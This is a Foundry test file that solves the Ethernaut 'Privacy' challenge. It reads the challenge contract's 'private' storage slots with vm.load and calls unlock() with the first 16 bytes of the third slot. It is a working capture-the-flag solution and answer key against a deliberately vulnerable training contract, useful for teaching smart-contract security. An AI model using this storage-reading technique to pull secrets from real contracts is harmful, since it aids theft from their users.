// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Privacy} from "../../src/ethernaut/12_Privacy/Privacy.sol";
import {Privacy_Factory} from "../../src/ethernaut/12_Privacy/Privacy_Factory.sol";
import {Privacy_Attacker} from "./12_Privacy_Attacker.sol";

contract Privacy_Test is Test {
	address deployer = makeAddr("deployer");
	address player = makeAddr("player");

	Privacy_Factory factory;
	Privacy instContract;
	
	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}
	
	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}
	
	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		startHoax(deployer);
		
		factory = new Privacy_Factory();
		instContract = Privacy(payable(factory.createInstance(player)));
		
		vm.stopPrank();
	}
	
	function test__Solution_Privacy() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_Privacy -vv
		
		// bytes32[3] private data; 是从第三个slot开始计算
		uint256 slotStart = 3;
		
		bytes32 data_0 = vm.load(address(instContract),bytes32(slotStart));
		slotStart++;
		
		bytes32 data_1 = vm.load(address(instContract),bytes32(slotStart));
		slotStart++;
		
		bytes32 data_2 = vm.load(address(instContract),bytes32(slotStart));
		slotStart++;
		
		instContract.unlock(bytes16(data_2));
	}
}
